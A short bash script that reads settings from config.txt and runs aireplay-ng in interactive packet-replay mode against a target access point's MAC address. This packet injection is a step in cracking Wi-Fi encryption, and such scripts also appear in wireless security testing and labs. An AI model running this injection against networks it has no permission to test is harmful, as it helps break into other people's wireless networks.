#!/bin/bash

source config.txt

aireplay-ng -2 -b $ap_mac -h $local_mac $interface
